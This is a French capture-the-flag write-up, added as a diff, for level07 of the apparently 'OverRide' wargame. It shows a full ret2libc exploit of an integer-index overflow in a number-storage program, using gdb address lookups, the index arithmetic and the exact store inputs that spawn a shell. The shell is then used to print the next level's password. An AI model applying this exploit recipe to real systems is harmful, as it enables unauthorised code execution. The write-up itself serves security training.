@@ -1,0 +1,167 @@
+Explication de  exploitation du level7
+
+Check des protection 
+
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
+
+
+on voit qu'il des protection contre les attaque  memoir notament sur ecriture  sur la  stack avec 
+avec une prtetion de  Partial sur la table goblale de function 
+
+level07@OverRide:~$ objdump -R level07
+
+level07:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049ff0 R_386_GLOB_DAT    __gmon_start__
+0804a040 R_386_COPY        stdin
+0804a060 R_386_COPY        stdout
+0804a000 R_386_JUMP_SLOT   printf
+0804a004 R_386_JUMP_SLOT   fflush
+0804a008 R_386_JUMP_SLOT   getchar
+0804a00c R_386_JUMP_SLOT   fgets
+0804a010 R_386_JUMP_SLOT   __stack_chk_fail
+0804a014 R_386_JUMP_SLOT   puts
+0804a018 R_386_JUMP_SLOT   __gmon_start__
+0804a01c R_386_JUMP_SLOT   __libc_start_main
+0804a020 R_386_JUMP_SLOT   memset
+0804a024 R_386_JUMP_SLOT   __isoc99_scanf
+
+on voit  qu'il pas de system ou  de function de pour exec un bash 
+
+on deux choix no-seld qui consite d'utilise un shell  code mais vue des protection on va choisir  le  
+deuxemen choix qui le ret2libc 
+
+donc premier  recuper le function system et exit  et /bin/sh
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+(gdb) info  proc mappings
+process 2014
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
+         0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
+         0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
+        0xf7e2b000 0xf7e2c000     0x1000        0x0
+        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so << ici ce trouver  tout  la libc utiliser par le proc
+        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+        0xf7fd0000 0xf7fd4000     0x4000        0x0
+        0xf7fda000 0xf7fdb000     0x1000        0x0
+        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb)
+
+strings -tx /lib32/libc-2.15.so | grep  "/bin/sh"
+15d7ec /bin/sh
+
+0xf7e2c000 + 15d7ec = 0xf7f897ec
+
+comportement  du prog 
+
+le programme va nous demande de en register des donne vie une command store 
+on pourra les read avec la command du meme nom et si veut quitter on aura  
+la command quit  va juste fair  un jump  sur  ret 
+
+Attaque 
+
+comment  peut  attaquer  vien un function pas possible donc sur  buf  dirctement 
+
+ 804872c:       81 ec d0 01 00 00       sub    $0x1d0,%esp << debut du buff 
+ 8048732:       8b 45 0c                mov    0xc(%ebp),%eax
+ 8048735:       89 44 24 1c             mov    %eax,0x1c(%esp)
+ 8048739:       8b 45 10                mov    0x10(%ebp),%eax
+ 804873c:       89 44 24 18             mov    %eax,0x18(%esp)
+ 8048740:       65 a1 14 00 00 00       mov    %gs:0x14,%eax
+ 8048746:       89 84 24 cc 01 00 00    mov    %eax,0x1cc(%esp)
+ 804874d:       31 c0                   xor    %eax,%eax
+ 804874f:       c7 84 24 b4 01 00 00    movl   $0x0,0x1b4(%esp)
+ 8048756:       00 00 00 00
+ 804875a:       c7 84 24 b8 01 00 00    movl   $0x0,0x1b8(%esp)
+ 8048761:       00 00 00 00
+ 8048765:       c7 84 24 bc 01 00 00    movl   $0x0,0x1bc(%esp)
+ 804876c:       00 00 00 00
+ 8048770:       c7 84 24 c0 01 00 00    movl   $0x0,0x1c0(%esp)
+ 8048777:       00 00 00 00
+ 804877b:       c7 84 24 c4 01 00 00    movl   $0x0,0x1c4(%esp)
+ 8048782:       00 00 00 00
+ 8048786:       c7 84 24 c8 01 00 00    movl   $0x0,0x1c8(%esp)
+ 804878d:       00 00 00 00
+ 8048791:       8d 5c 24 24             lea    0x24(%esp),%ebx
+ 8048795:       b8 00 00 00 00          mov    $0x0,%eax << fin du buff 
+
+via gdb on trouva le eip de celui ci 
+
+
+
+p/x $esp + 24 << pourquoi  24 car  grace  https://dogbolt.org/?id=8664e046-211f-4772-a084-6112ec01480f#BinaryNinja=212&Ghidra=329&Reko=108 
+                j'ai  put voir le  code source deacembalge il  une condition 'if (eax_1 % 3 && eax >> 0x18 != 0xb7)'
+                il faut trouver  l'index qui repecter c'est  condition mais en la contournant  
+
+$2 = 0xffffd548 
+
+
+ebx            0xffffd554       -10924 << pourquoi  ebx car 8048791:       8d 5c 24 24             lea    0x24(%esp),%ebx
+
+(gdb) info fram
+Stack level 0, frame at 0xffffd720:
+ eip = 0x8048729 in main; saved eip 0xf7e45513
+ Arglist at 0xffffd718, args:
+ Locals at 0xffffd718, Previous frame's sp is 0xffffd720
+ Saved registers:
+  ebp at 0xffffd718, eip at 0xffffd71c
+(gdb)
+
+0xffffd71c -  0xffffd554 = '0x1c8' / 4 (car  un int  == 4 octer ) = 114
+
+index epi  a ecraser == 114 problem on doit overflow
+
+0xffffffff / 4 + 114 + 1 = 1073741938
+
+Quit anyway? (y or n) y
+level07@OverRide:~$ python
+Python 2.7.3 (default, Jun 22 2015, 19:33:41)
+[GCC 4.6.3] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> hex(0xffffd71c -  0xffffd554)
+'0x1c8'
+>>> exit()
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store  command successfully
+Input command: store
+ Number: 4159028848
+ Index: 115
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$ cd ../level08
+$ cat .pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+$
